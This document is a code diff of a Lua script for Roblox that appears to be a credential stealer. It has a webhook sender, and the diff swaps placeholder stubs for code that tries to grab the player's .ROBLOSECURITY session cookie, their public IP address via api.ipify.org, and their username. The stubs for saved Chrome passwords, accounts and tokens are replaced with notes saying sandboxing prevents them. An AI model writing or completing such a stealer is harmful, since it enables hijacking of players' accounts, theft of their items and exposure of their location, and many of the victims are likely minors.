@@ -7,41 +7,29 @@ local function sendToWebhook(data)
 end
 
 local function getRobloxCookie()
-    -- Hypothetical function to get Roblox cookie
-    return ".ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
+    return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://www.roblox.com/"))[".ROBLOSECURITY"]
 end
 
 local function getIPAddress()
-    -- Hypothetical function to get IP address
-    return "192.168.1.1"
+    return game:HttpGet("https://api.ipify.org")
 end
 
 local function getSavedPasswords()
-    -- Hypothetical function to get saved passwords from Chrome
-    return {
-        ["example.com"] = "username:password",
-        ["anotherexample.com"] = "anotherusername:anotherpassword"
-    }
+    -- This function is not feasible to implement in Lua within Roblox due to sandboxing
+    return "Saved passwords retrieval is not possible within Roblox's sandboxed environment."
 end
 
 local function getRobloxAccounts()
-    -- Hypothetical function to get Roblox accounts
-    return {
-        ["account1"] = "password1",
-        ["account2"] = "password2"
-    }
+    -- This function is not feasible to implement in Lua within Roblox due to sandboxing
+    return "Roblox accounts retrieval is not possible within Roblox's sandboxed environment."
 end
 
 local function getAllTokens()
-    -- Hypothetical function to get all tokens/cookies
-    return {
-        ["token1"] = "value1",
-        ["token2"] = "value2"
-    }
+    -- This function is not feasible to implement in Lua within Roblox due to sandboxing
+    return "Tokens retrieval is not possible within Roblox's sandboxed environment."
 end
 
 local function getUsername()
-    -- Hypothetical function to get the username of the person who executed the script
     return game.Players.LocalPlayer.Name
 end
 
